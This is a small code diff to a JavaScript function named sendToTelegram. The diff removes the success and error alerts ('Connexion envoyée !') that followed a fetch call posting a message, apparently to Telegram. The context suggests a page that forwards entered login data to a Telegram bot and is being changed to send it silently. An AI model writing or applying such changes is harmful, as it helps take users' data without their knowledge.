@@ -27,11 +27,5 @@ function sendToTelegram(){
             text: message
         })
     })
-    .then(response => {
-        alert("Connexion envoyée !");
-    })
-    .catch(error => {
-        alert("Erreur d'envoi !");
-        console.error(error);
-    });
+   
 }
